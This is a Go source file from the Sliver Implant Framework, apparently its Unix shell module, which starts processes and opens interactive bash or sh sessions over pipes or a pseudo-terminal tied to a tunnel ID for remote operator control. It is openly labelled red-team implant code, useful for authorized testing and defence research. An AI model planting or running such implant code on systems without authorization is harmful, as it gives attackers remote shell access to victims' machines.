//go:build darwin || linux || freebsd || openbsd || dragonfly

package shell

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os/exec"

	"github.com/bishopfox/sliver/implant/sliver/shell/pty"
)

var (
	// Shell constants
	bash = []string{"/bin/bash"}
	sh   = []string{"/bin/sh"}
)

// Start - Start a process
func Start(command string) error {
	cmd := exec.Command(command)
	return cmd.Start()
}

// StartInteractive - Start a shell
func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell {
	if enablePty {
		return ptyShell(tunnelID, command)
	}
	return pipedShell(tunnelID, command)
}

func pipedShell(tunnelID uint64, command []string) *Shell {
	// {{if .Config.Debug}}
	log.Printf("[shell] %s", command)
	// {{end}}

	cmd := exec.Command(command[0], command[1:]...)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] stdin pipe failed\n")
		// {{end}}
		return nil
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] stdout pipe failed\n")
		// {{end}}
		return nil
	}

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  stdout,
		Stdin:   stdin,
	}
}

func ptyShell(tunnelID uint64, command []string) *Shell {
	// {{if .Config.Debug}}
	log.Printf("[ptmx] %s", command)
	// {{end}}

	cmd := exec.Command(command[0], command[1:]...)
	term, err := pty.Start(cmd)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[term] %v, falling back to piped shell...", err)
		// {{end}}
		return pipedShell(tunnelID, command)
	}
	cmd.Start()

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  term,
		Stdin:   term,
	}
}

// GetSystemShellPath - Find bash or sh
func GetSystemShellPath(path string) []string {
	if exists(path) {
		return []string{path}
	}
	if exists(bash[0]) {
		return bash
	}
	return sh
}
